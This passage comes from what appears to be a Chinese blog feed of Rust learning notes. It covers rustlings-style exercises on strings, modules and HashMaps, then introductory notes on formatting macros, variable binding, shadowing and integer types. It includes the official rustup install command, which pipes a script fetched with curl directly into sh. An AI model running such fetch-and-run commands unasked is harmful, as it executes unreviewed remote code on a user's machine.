function_ invoke__">string</span>(<span class="hljs-string">&quot;rust is fun!&quot;</span>.<span class="hljs-title function_ invoke__">to_owned</span>());<br>    <span class="hljs-title function_ invoke__">string</span>(<span class="hljs-string">&quot;nice weather&quot;</span>.<span class="hljs-title function_ invoke__">into</span>());<br>    <span class="hljs-title function_ invoke__">string</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;Interpolation &#123;&#125;&quot;</span>, <span class="hljs-string">&quot;Station&quot;</span>));<br>    <span class="hljs-title function_ invoke__">string_slice</span>(&amp;<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;abc&quot;</span>)[<span class="hljs-number">0</span>..<span class="hljs-number">1</span>]);<br>    <span class="hljs-title function_ invoke__">string_slice</span>(<span class="hljs-string">&quot;  hello there &quot;</span>.<span class="hljs-title function_ invoke__">trim</span>());<br>    <span class="hljs-title function_ invoke__">string</span>(<span class="hljs-string">&quot;Happy Monday!&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>().<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&quot;Mon&quot;</span>, <span class="hljs-string">&quot;Tues&quot;</span>));<br>    <span class="hljs-title function_ invoke__">string</span>(<span class="hljs-string">&quot;mY sHiFt KeY iS sTiCkY&quot;</span>.<span class="hljs-title function_ invoke__">to_lowercase</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>笔者遇到的坑是 <code>format!</code> 宏和 <code>to_lowercase()</code> 方法, 这两个方法的返回值都是 <code>String</code> 类型.</p><h3 id="Module">Module</h3><h4 id="1-v9">1</h4><p>可见性问题, 加一个 <code>pub</code> 即可在 mod 外的作用域访问.</p><h4 id="2-v9">2</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">mod</span> delicious_snacks &#123;<br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Fix these use statements</span><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">use</span> self::fruits::PEAR <span class="hljs-keyword">as</span> fruit;<br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">use</span> self::veggies::CUCUMBER <span class="hljs-keyword">as</span> veggie;<br><br>    <span class="hljs-keyword">mod</span> fruits &#123;<br>        <span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> PEAR: &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-type">str</span> = <span class="hljs-string">&quot;Pear&quot;</span>;<br>        <span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> APPLE: &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-type">str</span> = <span class="hljs-string">&quot;Apple&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">mod</span> veggies &#123;<br>        <span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> CUCUMBER: &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-type">str</span> = <span class="hljs-string">&quot;Cucumber&quot;</span>;<br>        <span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> CARROT: &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-type">str</span> = <span class="hljs-string">&quot;Carrot&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-built_in">println!</span>(<br>        <span class="hljs-string">&quot;favorite snacks: &#123;&#125; and &#123;&#125;&quot;</span>,<br>        delicious_snacks::fruit,<br>        delicious_snacks::veggie<br>    );<br>&#125;<br></code></pre></td></tr></table></figure><p>根据 main 里面的使用来修改 mod 的内容即可, use 要加可见性限制.</p><h4 id="3-v8">3</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> std::time::&#123;SystemTime,UNIX_EPOCH&#125;;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">match</span> SystemTime::<span class="hljs-title function_ invoke__">now</span>().<span class="hljs-title function_ invoke__">duration_since</span>(UNIX_EPOCH) &#123;<br>        <span class="hljs-title function_ invoke__">Ok</span>(n) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;1970-01-01 00:00:00 UTC was &#123;&#125; seconds ago!&quot;</span>, n.<span class="hljs-title function_ invoke__">as_secs</span>()),<br>        <span class="hljs-title function_ invoke__">Err</span>(_) =&gt; <span class="hljs-built_in">panic!</span>(<span class="hljs-string">&quot;SystemTime before UNIX EPOCH!&quot;</span>),<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>导入标准库的包和成员, 整体是个计算时间的函数.</p><h3 id="Hashmap">Hashmap</h3><h4 id="1-v10">1</h4><p>介绍 hashmap , 每个 hashmap 包括了 key 和 value 两部分.</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">fruit_basket</span>() <span class="hljs-punctuation">-&gt;</span> HashMap&lt;<span class="hljs-type">String</span>, <span class="hljs-type">u32</span>&gt; &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">basket</span> = HashMap::<span class="hljs-title function_ invoke__">new</span>();<br><br>    <span class="hljs-comment">// Two bananas are already given for you :)</span><br>    basket.<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;banana&quot;</span>), <span class="hljs-number">2</span>);<br>    basket.<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;otto&quot;</span>), <span class="hljs-number">6</span>);<br>    basket.<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;dog&quot;</span>), <span class="hljs-number">6</span>);<br><br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Put more fruits in your basket here.</span><br><br>    basket<br>&#125;<br><br><span class="hljs-meta">#[cfg(test)]</span><br><span class="hljs-keyword">mod</span> tests &#123;<br>    <span class="hljs-keyword">use</span> super::*;<br><br>    <span class="hljs-meta">#[test]</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">at_least_three_types_of_fruits</span>() &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">basket</span> = <span class="hljs-title function_ invoke__">fruit_basket</span>();<br>        <span class="hljs-built_in">assert!</span>(basket.<span class="hljs-title function_ invoke__">len</span>() &gt;= <span class="hljs-number">3</span>);<br>    &#125;<br><br>    <span class="hljs-meta">#[test]</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">at_least_five_fruits</span>() &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">basket</span> = <span class="hljs-title function_ invoke__">fruit_basket</span>();<br>        <span class="hljs-built_in">assert!</span>(basket.<span class="hljs-title function_ invoke__">values</span>().sum::&lt;<span class="hljs-type">u32</span>&gt;() &gt;= <span class="hljs-number">5</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>hashmap 的长度是由对数决定的, 有多少个键值对就有多长.</li><li><code>basket.values().sum::&lt;u32&gt;()</code> 是一个快捷计算 hashmap 中的 value 和的方法.</li></ul><h4 id="2-v10">2</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#[derive(Hash, PartialEq, Eq)]</span><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Fruit</span> &#123;<br>    Apple,<br>    Banana,<br>    Mango,<br>    Lychee,<br>    Pineapple,<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">fruit_basket</span>(basket: &amp;<span class="hljs-keyword">mut</span> HashMap&lt;Fruit, <span class="hljs-type">u32</span>&gt;) &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">fruit_kinds</span> = <span class="hljs-built_in">vec!</span>[<br>        Fruit::Apple,<br>        Fruit::Banana,<br>        Fruit::Mango,<br>        Fruit::Lychee,<br>        Fruit::Pineapple,<br>    ];<br><br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">fruit</span> <span class="hljs-keyword">in</span> fruit_kinds &#123;<br>        basket.<span class="hljs-title function_ invoke__">entry</span>(fruit).<span class="hljs-title function_ invoke__">or_insert</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#[cfg(test)]</span><br><span class="hljs-keyword">mod</span> tests &#123;<br>    <span class="hljs-keyword">use</span> super::*;<br><br>    <span class="hljs-comment">// Don&#x27;t modify this function!</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_fruit_basket</span>() <span class="hljs-punctuation">-&gt;</span> HashMap&lt;Fruit, <span class="hljs-type">u32</span>&gt; &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">basket</span> = HashMap::&lt;Fruit, <span class="hljs-type">u32</span>&gt;::<span class="hljs-title function_ invoke__">new</span>();<br>        basket.<span class="hljs-title function_ invoke__">insert</span>(Fruit::Apple, <span class="hljs-number">4</span>);<br>        basket.<span class="hljs-title function_ invoke__">insert</span>(Fruit::Mango, <span class="hljs-number">2</span>);<br>        basket.<span class="hljs-title function_ invoke__">insert</span>(Fruit::Lychee, <span class="hljs-number">5</span>);<br><br>        basket<br>    &#125;<br><br>    <span class="hljs-meta">#[test]</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">test_given_fruits_are_not_modified</span>() &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">basket</span> = <span class="hljs-title function_ invoke__">get_fruit_basket</span>();<br>        <span class="hljs-title function_ invoke__">fruit_basket</span>(&amp;<span class="hljs-keyword">mut</span> basket);<br>        <span class="hljs-built_in">assert_eq!</span>(*basket.<span class="hljs-title function_ invoke__">get</span>(&amp;Fruit::Apple).<span class="hljs-title function_ invoke__">unwrap</span>(), <span class="hljs-number">4</span>);<br>        <span class="hljs-built_in">assert_eq!</span>(*basket.<span class="hljs-title function_ invoke__">get</span>(&amp;Fruit::Mango).<span class="hljs-title function_ invoke__">unwrap</span>(), <span class="hljs-number">2</span>);<br>        <span class="hljs-built_in">assert_eq!</span>(*basket.<span class="hljs-title function_ invoke__">get</span>(&amp;Fruit::Lychee).<span class="hljs-title function_ invoke__">unwrap</span>(), <span class="hljs-number">5</span>);<br>    &#125;<br><br>    <span class="hljs-meta">#[test]</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">at_least_five_types_of_fruits</span>() &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">basket</span> = <span class="hljs-title function_ invoke__">get_fruit_basket</span>();<br>        <span class="hljs-title function_ invoke__">fruit_basket</span>(&amp;<span class="hljs-keyword">mut</span> basket);<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">count_fruit_kinds</span> = basket.<span class="hljs-title function_ invoke__">len</span>();<br>        <span class="hljs-built_in">assert!</span>(count_fruit_kinds &gt;= <span class="hljs-number">5</span>);<br>    &#125;<br><br>    <span class="hljs-meta">#[test]</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">greater_than_eleven_fruits</span>() &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">basket</span> = <span class="hljs-title function_ invoke__">get_fruit_basket</span>();<br>        <span class="hljs-title function_ invoke__">fruit_basket</span>(&amp;<span class="hljs-keyword">mut</span> basket);<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">count</span> = basket.<span class="hljs-title function_ invoke__">values</span>().sum::&lt;<span class="hljs-type">u32</span>&gt;();<br>        <span class="hljs-built_in">assert!</span>(count &gt; <span class="hljs-number">11</span>);<br>    &#125;<br>    <br>    <span class="hljs-meta">#[test]</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">all_fruit_types_in_basket</span>() &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">basket</span> = <span class="hljs-title function_ invoke__">get_fruit_basket</span>();<br>        <span class="hljs-title function_ invoke__">fruit_basket</span>(&amp;<span class="hljs-keyword">mut</span> basket);<br>        <span class="hljs-keyword">for</span> <span class="hljs-variable">amount</span> <span class="hljs-keyword">in</span> basket.<span class="hljs-title function_ invoke__">values</span>() &#123;<br>            <span class="hljs-built_in">assert_ne!</span>(amount, &amp;<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>题中主要保证键值对数量 &gt; 5 , 并且枚举的每一种都要用到.</p><p>所以这里的关键是:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">for</span> <span class="hljs-variable">fruit</span> <span class="hljs-keyword">in</span> fruit_kinds &#123;<br>        basket.<span class="hljs-title function_ invoke__">entry</span>(fruit).<span class="hljs-title function_ invoke__">or_insert</span>(<span class="hljs-number">1</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>查询这个 hashmap 中有没有这个东西, 没有就插入一个, value = 1</p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
      <category>Rust</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Rusttt</title>
    <link href="/2024/04/19/Rusttt/"/>
    <url>/2024/04/19/Rusttt/</url>
    
    <content type="html"><![CDATA[<h2 id="Rusttttt">Rusttttt</h2><p>给 [rust](<a href="https://www.rustacean.net/">Rustacean.net: Home of Ferris the Crab</a>) 稍微做点记录, (虽然估计这种笔记一样的法子不一定有用, 但是个人比较想写下来</p><p>顺序十有八九会很混乱, 属于是看到哪里就记录到哪里的类型了, 下文里面全角是原文, 半角是笔者自己写的一些各种东西</p><p>照着这些学的: [rust-by-example](<a href="https://rustwiki.org/zh-CN/rust-by-example/hello/print.html">格式化输出 - 通过例子学 Rust 中文版 (rustwiki.org)</a>), [rust圣经](<a href="https://course.rs/first-try/installation.html">安装 Rust 环境 - Rust语言圣经(Rust Course)</a>), [练习题](<a href="https://github.com/sunface/rust-by-practice?tab=readme-ov-file">sunface/rust-by-practice: Learning Rust By Practice, narrowing the gap between beginner and skilled-dev through challenging examples, exercises and projects. (github.com)</a>).</p><blockquote><p>后面暂时懒得写了, 有时间写完就补.</p></blockquote><h3 id="0x00-安装环境">0x00 安装环境</h3><p>暂时还在 win 上学 rust , 下个 c++ 环境然后使用 rustup , 等过段时间在 arch 装了会补.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --proto &#x27;=https&#x27; --tlsv1.2 -sSf https://sh.rustup.rs | sh<br></code></pre></td></tr></table></figure><h3 id="0x01-Rust-格式化输出">0x01 Rust 格式化输出</h3><blockquote><p>这个宏的作用似乎就是让写 c 和 py 中 fmt 的人更加熟悉, 反正也没学好, 再学一遍.</p></blockquote><p><a href="https://rustwiki.org/zh-CN/std/fmt/"><code>std::fmt</code></a> 包含多种 <a href="https://rustwiki.org/zh-CN/rust-by-example/trait.html"><code>trait</code></a>（特质）来控制文字显示，其中重要的两种 trait 的基本形式如下：</p><ul><li><code>fmt::Debug</code>：使用 <code>&#123;:?&#125;</code> 标记。格式化文本以供调试使用.</li><li><code>fmt::Display</code>：使用 <code>&#123;&#125;</code> 标记。以更优雅和友好的风格来格式化文本.</li></ul><p>基本的格式化宏是这些:</p><ul><li><code>format!</code>：将格式化文本写到字符串</li><li><code>print!</code>：与 <code>format!</code> 类似，但将文本输出到控制台（io::stdout）。</li><li><code>println!</code>: 与 <code>print!</code> 类似，但输出结果追加一个换行符。</li><li><code>eprint!</code>：与 <code>print!</code> 类似，但将文本输出到标准错误（io::stderr）。</li><li><code>eprintln!</code>：与 <code>eprint!</code> 类似，但输出结果追加一个换行符。</li></ul><p>参数也有很多种, 比如可以使用 <code>&#123;1&#125;</code> 这种位置参数, 也可以是命名参数,</p><p>还可以应用一些诸如<strong>宽度</strong>/<strong>对齐</strong>这一类的, 比如宽度:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Hello &#123;:5&#125;!&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>);<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Hello &#123;:1$&#125;!&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">5</span>);<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Hello &#123;1:0$&#125;!&quot;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&quot;x&quot;</span>);<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Hello &#123;:width$&#125;!&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>, width = <span class="hljs-number">5</span>);<br><span class="hljs-keyword">let</span> <span class="hljs-variable">width</span> = <span class="hljs-number">5</span>;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Hello &#123;:width$&#125;!&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>);<br><br><span class="hljs-comment">//result: Hello x    !</span><br></code></pre></td></tr></table></figure><p>比如说要补全, 例如从 10 变到 0010 需要 <code>&#123;:04&#125;</code> , 指定宽度 + 填充字符.</p><blockquote><p>这和 c 的格式化字符串的那些参数基本类似, 不多赘述了（</p></blockquote><h3 id="0x02-变量">0x02 变量</h3><h4 id="绑定-可变性">绑定/可变性</h4><p>rust 圣经里面说: 在其他语言中给一个变量赋值大概是一个这样的语句: <code>var a = 'otto'</code> ,</p><p>而在 rust 中, 这个赋值过程是这样的写法:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">a</span> = <span class="hljs-symbol">&#x27;otto</span>&#x27;<br></code></pre></td></tr></table></figure><p>这个过程在 rust 中有一个新名字叫 ‘变量绑定’ .</p><blockquote><p>为何不用赋值而用绑定呢（其实你也可以称之为赋值，但是绑定的含义更清晰准确）？这里就涉及 Rust 最核心的原则——<strong>所有权</strong>，简单来讲，任何内存对象都是有主人的，而且一般情况下完全属于它的主人，绑定就是把这个对象绑定给一个变量，让这个变量成为它的主人（聪明的读者应该能猜到，在这种情况下，该对象之前的主人就会丧失对该对象的所有权），像极了我们的现实世界，不是吗？</p><p>这似乎看起来非常安全的样子（</p></blockquote><p>绑定后的变量在一般情况下是不可变的, 即:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = <span class="hljs-number">5</span>;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);<br>    x = <span class="hljs-number">6</span>;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);<br>&#125;<br><span class="hljs-comment">// cannot assign twice to immutable variable x</span><br></code></pre></td></tr></table></figure><p>这种单纯使用类似 c 一样的赋值语句会报错 ‘无法对不可变的变量重复赋值’, 如果想要让这个变量是可变的, 只需要加入 <code>mut</code> 关键字即可.</p><h4 id="下划线忽略">下划线忽略</h4><p>如果我们创建一个变量却不使用的话, 只需在前面加一个下划线, 编译器就不会给出提示.</p><blockquote><p>感觉这也是偏向于安全性的提醒, 挺有趣的（</p></blockquote><h4 id="变量解构">变量解构</h4><p><code>let</code> 表达式不仅仅用于变量的绑定，还能进行复杂变量的解构：从一个相对复杂的变量中，匹配出该变量的一部分内容.</p><blockquote><p>好像很复杂, 实际看起来就是匹配复杂表达式的值的感觉, 强调 let 的使用.</p></blockquote><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Struct</span> &#123;<br>    e: <span class="hljs-type">i32</span><br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> (a, b, c, d, e);<br><br>    (a, b) = (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-comment">// _ 代表匹配一个值，但是我们不关心具体的值是什么，因此没有使用一个变量名而是使用了 _</span><br>    [c, .., d, _] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br>    Struct &#123; e, .. &#125; = Struct &#123; e: <span class="hljs-number">5</span> &#125;;<br><br>    <span class="hljs-built_in">assert_eq!</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>], [a, b, c, d, e]);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="常量-变量">常量/变量</h4><blockquote><p>本来觉得 let 声明的变量不可变和 const 是差不多的（</p></blockquote><p>rust 中也存在 const 关键字, 不可用 mut 标注, 且自始至终不可变, 这样看来似乎 mut 是单纯维护安全性的设定了, Rust 常量的命名约定是全部字母都使用大写, 并使用下划线分隔单词, 另外对数字字面量可插入下划线以提高可读性.</p><h4 id="相同变量-shadowing">相同变量 (shadowing)</h4><p>rust 在声明相同名字的变量时采取后者覆盖前者的一个设定,</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = <span class="hljs-number">5</span>;<br>    <span class="hljs-comment">// 在main函数的作用域内对之前的x进行遮蔽</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = x + <span class="hljs-number">1</span>;<br><br>    &#123;<br>        <span class="hljs-comment">// 在当前的花括号作用域内，对之前的x进行遮蔽</span><br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = x * <span class="hljs-number">2</span>;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;The value of x in the inner scope is: &#123;&#125;&quot;</span>, x);<br>    &#125;<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);<br>&#125;<br></code></pre></td></tr></table></figure><p>但是这些叫做 x 的变量是完全不同的几个东西, 实际上是多次声明相同变量的行为.</p><h3 id="0x03-各种类型">0x03 各种类型</h3><p>Rust 每个值都有其确切的数据类型，总的来说可以分为两类：基本类型和复合类型。 基本类型意味着它们往往是一个最小化原子类型，无法解构为其它类型(一般意义上来说)，由以下组成：</p><ul><li>数值类型: 有符号整数 (<code>i8</code>, <code>i16</code>, <code>i32</code>, <code>i64</code>, <code>isize</code>)、 无符号整数 (<code>u8</code>, <code>u16</code>, <code>u32</code>, <code>u64</code>, <code>usize</code>) 、浮点数 (<code>f32</code>, <code>f64</code>)、以及有理数、复数</li><li>字符串：字符串字面量和字符串切片 <code>&amp;str</code></li><li>布尔类型：<code>true</code>和<code>false</code></li><li>字符类型: 表示单个 Unicode 字符，存储为 4 个字节</li><li>单元类型: 即 <code>()</code> ，其唯一的值也是 <code>()</code></li></ul><h4 id="类型推导">类型推导</h4><p>这里大概的意思就是, rust 编译器比较智能, 它可以适当推测这个变量是个什么类型, 比如:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">guess</span> = <span class="hljs-string">&quot;42&quot;</span>.<span class="hljs-title function_ invoke__">parse</span>().<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">&quot;Not a number!&quot;</span>);<br></code></pre></td></tr></table></figure><p>在给出这个 let 语句之后, 编译器就会猜这是个什么东西, 如果能猜出来就猜出来了, 猜不出来会报错.</p><p>但是实际上又没有那么智能, 所以实际上需要一些标注, 像这样:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">a</span>: <span class="hljs-type">i32</span> = <span class="hljs-number">20</span>;<br></code></pre></td></tr></table></figure><p>类型后缀也可以, 比如 <code>let a = 20i32</code> .</p><p><strong>在 rust 中, 只有同一类型的变量才可进行比较.</strong></p><h4 id="数值">数值</h4><h5 id="整数">整数</h5><p><strong>整数</strong>是没有小数部分的数字。之前使用过的 <code>i32</code> 类型，表示有符号的 32 位整数（ <code>i</code> 是英文单词 <em>integer</em> 的首字母，与之相反的是 <code>u</code>，代表无符号 <code>unsigned</code> 类型）。下表显示了 Rust 中的内置的整数类型：</p><table><thead><tr><th>长度</th><th>有符号类型</th><th>无符号类型</th></tr></thead><tbody><tr><td>8 位</td><td><code>i8</code></td><td><code>u8</code></td></tr><tr><td>16 位</td><td><code>i16</code></td><td><code>u16</code></td></tr><tr><td>32 位</td><td><code>i32</code></td><td><code>u32</code></td></tr><tr><td>64 位</td><td><code>i64</code></td><td><code>u64</code></td></tr><tr><td>128 位</td><td><code>i128</code></td><td><code>u128</code></td></tr><tr><td>视架构而定</td><td><code>isize</code></td><td><code>usize</code></td></tr></tbody></table><p>在 rust 中, 整型默认是 i32 